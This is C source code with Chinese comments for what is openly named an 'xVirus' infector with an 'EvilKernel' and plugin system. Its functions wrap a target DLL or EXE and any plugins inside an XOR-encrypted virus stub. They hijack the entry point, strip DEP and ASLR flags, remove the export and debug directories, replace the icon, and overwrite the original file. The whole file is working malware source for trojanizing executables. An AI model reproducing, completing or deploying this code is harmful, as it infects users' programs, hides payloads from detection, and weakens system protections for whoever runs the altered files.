#include "Common.h"
#include "Support.h"
#include "EvilPlugin.h"
#include "EvilKernel.h"
#include "xVirusDll.h"
#include "resource.h"

/*
 * 全局变量
 */
HMODULE g_hModule = NULL;;
EVILKERNEL_CONFIGURE g_EvilKernelConfigure = {0};
__tchar g_EvilPluginNameArray[__MAX_EVIL_PLUGIN_COUNT__][__EVIL_PLUGIN_NAME_LENGTH__] = {0};
__integer g_iEvilPluginTotalCount = 0;

// 计算插件的总大小
__INLINE__ __integer __INTERNAL_FUNC__ TotalOfEvilPlugins(PEVILKERNEL_CONFIGURE pEvilKernelConfigure) {
	__integer iRet = 0;
	__integer i = 0;
	for (i = 0; i < pEvilKernelConfigure->iPluginTotalCount; i++)
		iRet += pEvilKernelConfigure->PluginSizeArray[i];
	return iRet;
}

/*
 * 添加其余源代码
 */
#include "..\Common\xVirusCrypto.c"

/*
 * 设置插件
 */
__integer __API__ xVirusInsertPlugin(__tchar *pPluginPath) {
	__char szPluginPath[__EVIL_PLUGIN_NAME_LENGTH__] = {0};
	__integer iPluginPathLength = 0;
	__integer iPluginSize = 0;

	iPluginSize = GetFilePhySize(pPluginPath);//获取插件文件长度
	iPluginPathLength = __logic_tcslen__(pPluginPath);
	__logic_tcscpy__(g_EvilPluginNameArray[g_iEvilPluginTotalCount], pPluginPath);
	g_EvilKernelConfigure.PluginSizeArray[g_iEvilPluginTotalCount] = iPluginSize;
#if defined(__DEBUG_EVIL_PLUGIN__)
	UnicodeToAnsi(pPluginPath, iPluginPathLength, szPluginPath, __EVIL_PLUGIN_NAME_LENGTH__);
	__logic_strcpy__(g_EvilKernelConfigure.PluginNameArray[g_iEvilPluginTotalCount], szPluginPath);
#endif
	g_iEvilPluginTotalCount++;
	g_EvilKernelConfigure.iPluginTotalCount = g_iEvilPluginTotalCount;
	return g_iEvilPluginTotalCount;
}

/*
 * 将x病毒感染到DLL上
 */
__bool __API__ xVirusInfect2Dll(__tchar *pTargetPath) {
	__memory pTarget = NULL;
	__integer iTargetSize = 0;
	__memory pManifest = NULL;
	__integer iManifestSize = 0;
	PRESOURCE_INFO pManifestInfo = NULL;
	__memory pTailData = NULL;
	__integer iTailDataSize = 0;
	PIMAGE_NT_HEADERS pTargetNtHdr = NULL;
	__integer iTargetSizeOfImage = 0;
	__word wTargetSubsystem = 0;
	__memory xVirusMap = NULL;
	__integer xVirusMapSize = 0;
	PIMAGE_NT_HEADERS xVirusMapNtHdr = NULL;
	PIMAGE_SECTION_HEADER pEvilKernelSectionHdr = NULL;
	__memory pEvilKernel = NULL;
	__integer iEvilKernelSize = 0;

	// 映射目标程序
	pTarget = (__memory)MappingFile(pTargetPath, &iTargetSize, TRUE, 0, 0);
	if (!pTarget)
		return FALSE;

	pTargetNtHdr = GetNtHeader(pTarget);
	// 获取目标程序的映射大小
	iTargetSizeOfImage = pTargetNtHdr->OptionalHeader.SizeOfImage;

	// 如果目标程序存在manifest则获取它的信息
	pManifestInfo = GetManifestResourceInfo(pTarget);
	if (pManifestInfo) {
		iManifestSize = pManifestInfo->iPointSize;
		pManifest = (__memory)__logic_new_size__(iManifestSize);
		__logic_memcpy__(pManifest, pManifestInfo->pPoint, iManifestSize);
		__logic_delete__(pManifestInfo);
	}

	// 获取末尾数据
	{
		__memory pTailTmp = NULL;
		pTailData = GetTailDataPoint(pTarget, iTargetSize);
		iTailDataSize = GetTailDataSize(pTarget, iTargetSize);
		if (pTailData) {
			pTailTmp = (__memory)__logic_new_size__(iTailDataSize);
			__logic_memcpy__(pTailTmp, pTailData, iTailDataSize);
			pTailData = pTailTmp;
			//iTargetSize -= iTailDataSize;
			//// 重新映射目标程序
			//UnMappingFile(pTarget);
			//pTarget = (__memory)MappingFile(pTargetPath, NULL, TRUE, 0, iTargetSize);
			//if (!pTarget) {
			//	if (pManifest) __logic_delete__(pManifest);
			//	__logic_delete__(pTailData);
			//	return FALSE;
			//}/* end if */
		}/* end if */
	}

	// 设置目标文件的长度到配置结构
	g_EvilKernelConfigure.iTargetFileSize = iTargetSize;//无末尾数据长度的长度

	// 将目标程序附加到邪恶核心上
	{
		/*
		 * 邪恶核心新节结构
		 * 配置结构
		 * 目标程序
		 * 各类插件
		 */
		PIMAGE_SECTION_HEADER pTargetSectionHdr = NULL;
		__integer iTotalOfEvilPlugins = 0;
		__integer iTargetSectionSize = 0;
		pEvilKernel = MapResourceData(g_hModule, IDR_EVILKERNEL, _T("BIN"), &iEvilKernelSize);
		if (!pEvilKernel) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}

		// 计算新节长度
		iTotalOfEvilPlugins = TotalOfEvilPlugins(&g_EvilKernelConfigure);
		iTargetSectionSize = sizeof(EVILKERNEL_CONFIGURE) + iTargetSize + iTotalOfEvilPlugins;
		iTargetSectionSize = GetAddSectionMapSize(pEvilKernel, iTargetSectionSize);
		// 重新映射邪恶核心
		pEvilKernel = MapResourceDataPlusNewSize(pEvilKernel, iEvilKernelSize, iTargetSectionSize);
		if (!pEvilKernel) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}
		iEvilKernelSize += iTargetSectionSize;
		// 添加新节
#define __DEF_EVILKERNEL_TARGET_SECTION_NAME__					".ET"
		pTargetSectionHdr = AddSection(pEvilKernel, __DEF_EVILKERNEL_TARGET_SECTION_NAME__, \
									   __DEF_NEWSECTION_CHARACTERISTICS__, iTargetSectionSize, NULL, FALSE);
		if (!pTargetSectionHdr) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}

		// 写入数据
		{
			__memory pWriteTo = NULL;
			pWriteTo = pEvilKernel + pTargetSectionHdr->PointerToRawData;
			// 设置类型
			g_EvilKernelConfigure.bIsDll = TRUE;
			__logic_memcpy__(pWriteTo, &g_EvilKernelConfigure, sizeof(EVILKERNEL_CONFIGURE));
			__logic_memcpy__(pWriteTo + sizeof(EVILKERNEL_CONFIGURE), pTarget, iTargetSize);
			pWriteTo += (sizeof(EVILKERNEL_CONFIGURE) + iTargetSize);
			// 循环写入插件
			{
				__integer i = 0;
				__memory pCurrPlugin = NULL;
				__integer iCurrPluginSize = 0;
				__tchar *pPluginName = NULL;
				for (i = 0; i < g_EvilKernelConfigure.iPluginTotalCount; i++) {
					pPluginName = (__tchar *)&(g_EvilPluginNameArray[i]);
					pCurrPlugin = MappingFile(pPluginName, &iCurrPluginSize, FALSE, 0, 0);
					__logic_memcpy__(pWriteTo, pCurrPlugin, iCurrPluginSize);
					pWriteTo += iCurrPluginSize;
					UnMappingFile(pCurrPlugin);
				}
			}
		}
		// 关闭映射目标
		UnMappingFile(pTarget);
	}

	// 映射X病毒
	xVirusMap = MapResourceData(g_hModule, IDR_XVIRUS_DLL, _T("BIN"), &xVirusMapSize);
	if (!xVirusMap) {
		if (pManifest) __logic_delete__(pManifest);
		if (pTailData) __logic_delete__(pTailData);
		UnMapResourceData(pEvilKernel);
		return FALSE;
	}

	// 将邪恶核心添加到X病毒的新节
	{
		__integer iEvilKernelSectionSize = 0;
		__memory pEvilKernelWriteTo = NULL;
		__dword dwKey = 0;

		// 获取新末尾节大小
		iEvilKernelSectionSize = iEvilKernelSize + iTargetSizeOfImage + iManifestSize;
		iEvilKernelSectionSize = GetAddSectionMapSize(xVirusMap, iEvilKernelSectionSize);

		// 重新映射xVirusDll
		xVirusMap = MapResourceDataPlusNewSize(xVirusMap, xVirusMapSize, iEvilKernelSectionSize);
		if (!xVirusMap) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			UnMapResourceData(pEvilKernel);
			return FALSE;
		}
		xVirusMapSize += iEvilKernelSectionSize;//重新设置长度

		// 添加新节
#define __XVIRUS_DLL_NEW_SECTION_NAME__			".ET"
		pEvilKernelSectionHdr = AddSection(xVirusMap, __XVIRUS_DLL_NEW_SECTION_NAME__, __DEF_NEWSECTION_CHARACTERISTICS__, \
										   iEvilKernelSectionSize, NULL, FALSE);
		if (!pEvilKernelSectionHdr) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			UnMapResourceData(pEvilKernel);
			return FALSE;
		}

		// 将邪恶核心写入到末尾数据
		pEvilKernelWriteTo = xVirusMap + pEvilKernelSectionHdr->PointerToRawData;

		// 计算密钥
		dwKey = __XVIRUS_DLL_DECODE_KEY__;
		// 加密
		XorArray(dwKey, pEvilKernel, pEvilKernelWriteTo, iEvilKernelSize);

		// 关闭邪恶核心映射
		UnMapResourceData(pEvilKernel);
	}

	// 如果存在manifest文件则重新设定manifest
	if (iManifestSize) {
		// 获取xVirus的manifest
		PRESOURCE_INFO xVirusMapManifestInfo = GetManifestResourceInfo(xVirusMap);
		if (xVirusMapManifestInfo) {
			__offset ofManifestRva = 0;
			__offset ofManifestRaw = 0;
			__memory pManifestNewLocal = NULL;
			/*
			 * 内存布局图
			 * 邪恶核心
			 * Manifest
			 */
			ofManifestRaw = pEvilKernelSectionHdr->PointerToRawData + iEvilKernelSize + iTargetSizeOfImage;
			pManifestNewLocal = xVirusMap + ofManifestRaw;
			__logic_memcpy__(pManifestNewLocal, pManifest, iManifestSize);
			ofManifestRva = Raw2Rva(xVirusMap, ofManifestRaw);
			xVirusMapManifestInfo->pDataEntry->OffsetToData = ofManifestRva;
			xVirusMapManifestInfo->pDataEntry->Size = iManifestSize;
		}
		__logic_delete__(pManifest);
		__logic_delete__(xVirusMapManifestInfo);
	}

	// 重新获取xVirusDll的NT头
	xVirusMapNtHdr = __GetNtHeader__(xVirusMap);

	// 只去掉数据执行保护兼容
	xVirusMapNtHdr->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
	//xVirusMapNtHdr->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

	// 是否保留目标文件的末尾数据
	if (pTailData) {
		xVirusMap = MapResourceDataPlusNewSize(xVirusMap, xVirusMapSize, iTailDataSize);
		if (!xVirusMap) {
			__logic_delete__(xVirusMap);
			return FALSE;
		}
		__logic_memcpy__(xVirusMap + xVirusMapSize, pTailData, iTailDataSize);
		__logic_delete__(pTailData);
		xVirusMapSize += iTailDataSize;
	}

	// 重新设定保护器的校验和
	RefixCheckSum(xVirusMap, xVirusMapSize);

	// 生成保护后的文件
	DeleteFile(pTargetPath);
	UnMapResourceDataToFile(pTargetPath, xVirusMap, xVirusMapSize);
	UnMapResourceData(xVirusMap);//直接销毁

	{
		// 重新设置入口点
		__offset ofOrigEntryAddressRva = 0;
		__offset *pofOrigEntryAddressRva = NULL;
		__address *paddrDllStartup = NULL;
		__offset ofDllStartupRva = 0;

		// 映射目标程序
		pTarget = (__memory)MappingFile(pTargetPath, &iTargetSize, TRUE, 0, 0);
		if (!pTarget)
			return FALSE;

		pTargetNtHdr = GetNtHeader(pTarget);
		ofOrigEntryAddressRva = pTargetNtHdr->OptionalHeader.AddressOfEntryPoint;

		pofOrigEntryAddressRva = (__offset *)xGetAddressFromOnFile(pTarget, "g_ofOrigEntryAddressRva", NULL);
		if (!pofOrigEntryAddressRva) {
			UnMappingFile(pTarget);
			return FALSE;
		}
		*pofOrigEntryAddressRva = ofOrigEntryAddressRva;//保存原入口点

		paddrDllStartup = (__address *)xGetAddressFromOnFile(pTarget, "DllStartup", &ofDllStartupRva);
		if (!paddrDllStartup) {
			UnMappingFile(pTarget);
			return FALSE;
		}
		
		// 修改入口点
		pTargetNtHdr->OptionalHeader.AddressOfEntryPoint = ofDllStartupRva;

		// 删除X病毒DLL的调试节, 引入表, 引出表
		DeleteDataDirectoryObject(pTarget, IMAGE_DIRECTORY_ENTRY_EXPORT);
		DeleteDataDirectoryObject(pTarget, IMAGE_DIRECTORY_ENTRY_DEBUG);

		// 关闭映射目标
		UnMappingFile(pTarget);
	}

	return TRUE;
}

/*
 * 将x病毒感染到EXE上
 */
__bool __API__ xVirusInfect2Exe(__tchar *pTargetPath, __tchar *pIconPath) {
	__memory pTarget = NULL;
	__integer iTargetSize = 0;
	__memory pManifest = NULL;
	__integer iManifestSize = 0;
	PRESOURCE_INFO pManifestInfo = NULL;
	__memory pTailData = NULL;
	__integer iTailDataSize = 0;
	PIMAGE_NT_HEADERS pTargetNtHdr = NULL;
	__address addrTargetImageBase = 0;
	__integer iTargetSizeOfImage = 0;
	__word wTargetSubsystem = 0;
	__memory xVirusMap = NULL;
	__integer xVirusMapSize = 0;
	PIMAGE_NT_HEADERS xVirusMapNtHdr = NULL;
	PIMAGE_SECTION_HEADER pEvilKernelSectionHdr = NULL;
	__memory pEvilKernel = NULL;
	__integer iEvilKernelSize = 0;

	// 映射目标程序
	pTarget = (__memory)MappingFile(pTargetPath, &iTargetSize, TRUE, 0, 0);
	if (!pTarget)
		return FALSE;

	pTargetNtHdr = GetNtHeader(pTarget);
	// 获取目标程序的映射大小与基地址
	addrTargetImageBase = pTargetNtHdr->OptionalHeader.ImageBase;
	iTargetSizeOfImage = pTargetNtHdr->OptionalHeader.SizeOfImage;
	wTargetSubsystem = pTargetNtHdr->OptionalHeader.Subsystem;

	// 如果目标程序存在manifest则获取它的信息
	pManifestInfo = GetManifestResourceInfo(pTarget);
	if (pManifestInfo) {
		iManifestSize = pManifestInfo->iPointSize;
		pManifest = (__memory)__logic_new_size__(iManifestSize);
		__logic_memcpy__(pManifest, pManifestInfo->pPoint, iManifestSize);
		__logic_delete__(pManifestInfo);
	}

	// 获取末尾数据
	{
		__memory pTailTmp = NULL;
		pTailData = GetTailDataPoint(pTarget, iTargetSize);
		iTailDataSize = GetTailDataSize(pTarget, iTargetSize);
		if (pTailData) {
			pTailTmp = (__memory)__logic_new_size__(iTailDataSize);
			__logic_memcpy__(pTailTmp, pTailData, iTailDataSize);
			pTailData = pTailTmp;
			//// 重新映射目标程序
			//iTargetSize -= iTailDataSize;
			//UnMappingFile(pTarget);
			//pTarget = (__memory)MappingFile(pTargetPath, NULL, TRUE, 0, iTargetSize);
			//if (!pTarget) {
			//	if (pManifest) __logic_delete__(pManifest);
			//	__logic_delete__(pTailData);
			//	return FALSE;
			//}/* end if */
		}/* end if */
	}

	// 设置目标文件的长度到配置结构
	g_EvilKernelConfigure.iTargetFileSize = iTargetSize;

	// 将目标程序附加到邪恶核心上
	{
		/*
		 * 邪恶核心新节结构
		 * 配置结构
		 * 目标程序
		 * 各类插件
		 */
		PIMAGE_SECTION_HEADER pTargetSectionHdr = NULL;
		__integer iTotalOfEvilPlugins = 0;
		__integer iTargetSectionSize = 0;
		pEvilKernel = MapResourceData(g_hModule, IDR_EVILKERNEL, _T("BIN"), &iEvilKernelSize);
		if (!pEvilKernel) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}

		// 计算新节长度
		iTotalOfEvilPlugins = TotalOfEvilPlugins(&g_EvilKernelConfigure);
		iTargetSectionSize = sizeof(EVILKERNEL_CONFIGURE) + iTargetSize + iTotalOfEvilPlugins;
		iTargetSectionSize = GetAddSectionMapSize(pEvilKernel, iTargetSectionSize);
		// 重新映射邪恶核心
		pEvilKernel = MapResourceDataPlusNewSize(pEvilKernel, iEvilKernelSize, iTargetSectionSize);
		if (!pEvilKernel) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}
		iEvilKernelSize += iTargetSectionSize;
		// 添加新节
#define __DEF_EVILKERNEL_TARGET_SECTION_NAME__					".ET"
		pTargetSectionHdr = AddSection(pEvilKernel, __DEF_EVILKERNEL_TARGET_SECTION_NAME__, \
									   __DEF_NEWSECTION_CHARACTERISTICS__, iTargetSectionSize, NULL, FALSE);
		if (!pTargetSectionHdr) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			return FALSE;
		}

		// 写入数据
		{
			__memory pWriteTo = NULL;
			pWriteTo = pEvilKernel + pTargetSectionHdr->PointerToRawData;
			// 设置类型
			g_EvilKernelConfigure.bIsDll = FALSE;
			__logic_memcpy__(pWriteTo, &g_EvilKernelConfigure, sizeof(EVILKERNEL_CONFIGURE));
			__logic_memcpy__(pWriteTo + sizeof(EVILKERNEL_CONFIGURE), pTarget, iTargetSize);
			pWriteTo += (sizeof(EVILKERNEL_CONFIGURE) + iTargetSize);
			// 循环写入插件
			{
				__integer i = 0;
				__memory pCurrPlugin = NULL;
				__integer iCurrPluginSize = 0;
				__tchar *pPluginName = NULL;
				for (i = 0; i < g_EvilKernelConfigure.iPluginTotalCount; i++) {
					pPluginName = (__tchar *)&(g_EvilPluginNameArray[i]);
					pCurrPlugin = MappingFile(pPluginName, &iCurrPluginSize, FALSE, 0, 0);
					__logic_memcpy__(pWriteTo, pCurrPlugin, iCurrPluginSize);
					pWriteTo += iCurrPluginSize;
					UnMappingFile(pCurrPlugin);
				}
			}
		}
		// 关闭映射目标
		UnMappingFile(pTarget);
	}

	// 映射X病毒
	xVirusMap = MapResourceData(g_hModule, IDR_XVIRUS, _T("BIN"), &xVirusMapSize);
	if (!xVirusMap) {
		if (pManifest) __logic_delete__(pManifest);
		if (pTailData) __logic_delete__(pTailData);
		UnMapResourceData(pEvilKernel);
		return FALSE;
	}

	// 设置X病毒到目标程序基地址
	if (BaseRelocationOnFile(xVirusMap, addrTargetImageBase) == FALSE) {
		if (pManifest) __logic_delete__(pManifest);
		if (pTailData) __logic_delete__(pTailData);
		UnMapResourceData(pEvilKernel);
		return FALSE;
	}

	// 将邪恶核心扩展到X病毒的末尾节
	{
		__integer iEvilKernelSectionSize = 0;
		__memory pEvilKernelWriteTo = NULL;
		__dword dwKey = 0;

		// 获取新末尾节大小
		iEvilKernelSectionSize = iEvilKernelSize + iTargetSizeOfImage + iManifestSize;

		// 扩展保护器末尾节大小
		pEvilKernelSectionHdr = CoverTailSectionFromImage(xVirusMap, (__memory *)&xVirusMap, xVirusMapSize, iEvilKernelSectionSize, \
														  NULL, 0, &xVirusMapSize);
		if (!pEvilKernelSectionHdr) {
			if (pManifest) __logic_delete__(pManifest);
			if (pTailData) __logic_delete__(pTailData);
			UnMapResourceData(pEvilKernel);
			return FALSE;
		}

		// 将邪恶核心写入到末尾数据
		pEvilKernelWriteTo = xVirusMap + pEvilKernelSectionHdr->PointerToRawData;

		// 计算密钥
		{
			PIMAGE_SECTION_HEADER xVirusCodeSectionHdr = NULL;
			__memory xVirusCode = NULL;
			__integer xVirusSize = 0;

			xVirusCodeSectionHdr = GetEntryPointSection(xVirusMap);
			xVirusCode = xVirusMap + xVirusCodeSectionHdr->PointerToRawData;
			xVirusSize = xVirusCodeSectionHdr->Misc.VirtualSize;
			dwKey = crc32(xVirusCode, xVirusSize);
		}
		// 加密
		XorArray(dwKey, pEvilKernel, pEvilKernelWriteTo, iEvilKernelSize);

		// 关闭邪恶核心映射
		UnMapResourceData(pEvilKernel);
	}

	// 如果存在manifest文件则重新设定manifest
	if (iManifestSize) {
		// 获取xVirus的manifest
		PRESOURCE_INFO xVirusMapManifestInfo = GetManifestResourceInfo(xVirusMap);
		if (xVirusMapManifestInfo) {
			__offset ofManifestRva = 0;
			__offset ofManifestRaw = 0;
			__memory pManifestNewLocal = NULL;
			/*
			 * 内存布局图
			 * 邪恶核心
			 * Manifest
			 */
			ofManifestRaw = pEvilKernelSectionHdr->PointerToRawData + iEvilKernelSize + iTargetSizeOfImage;
			pManifestNewLocal = xVirusMap + ofManifestRaw;
			__logic_memcpy__(pManifestNewLocal, pManifest, iManifestSize);
			ofManifestRva = Raw2Rva(xVirusMap, ofManifestRaw);
			xVirusMapManifestInfo->pDataEntry->OffsetToData = ofManifestRva;
			xVirusMapManifestInfo->pDataEntry->Size = iManifestSize;
		}
		__logic_delete__(pManifest);
		__logic_delete__(xVirusMapManifestInfo);
	}

	// 设置子系统
	xVirusMapNtHdr = GetNtHeader(xVirusMap);
	xVirusMapNtHdr->OptionalHeader.Subsystem = wTargetSubsystem;

	/*
	 * 设置以下属性,是由于xVirus引出变量的原因
	 * 这样可以使程序正常运行
	 */
	// 设置文件属性
	xVirusMapNtHdr->FileHeader.Characteristics = (IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_32BIT_MACHINE);

	// 去掉数据执行保护兼容与随机地址化映射兼容
	xVirusMapNtHdr->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
	xVirusMapNtHdr->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

	// 删除保护器的调试节, 引入表, 引出表
	DeleteDataDirectoryObject(xVirusMap, IMAGE_DIRECTORY_ENTRY_EXPORT);
	DeleteDataDirectoryObject(xVirusMap, IMAGE_DIRECTORY_ENTRY_DEBUG);

	// 是否保留目标文件的末尾数据
	if (pTailData) {
		xVirusMap = MapResourceDataPlusNewSize(xVirusMap, xVirusMapSize, iTailDataSize);
		if (!xVirusMap) {
			__logic_delete__(xVirusMap);
			return FALSE;
		}
		__logic_memcpy__(xVirusMap + xVirusMapSize, pTailData, iTailDataSize);
		__logic_delete__(pTailData);
		xVirusMapSize += iTailDataSize;
	}

	// 重新设定保护器的校验和
	RefixCheckSum(xVirusMap, xVirusMapSize);

	// 生成保护后的文件
	DeleteFile(pTargetPath);
	UnMapResourceDataToFile(pTargetPath, xVirusMap, xVirusMapSize);
	UnMapResourceData(xVirusMap);//直接销毁

	// 是否替换ICON
	if (pIconPath)
		ChangedExeIcon(pTargetPath, pIconPath);

	return TRUE;
}

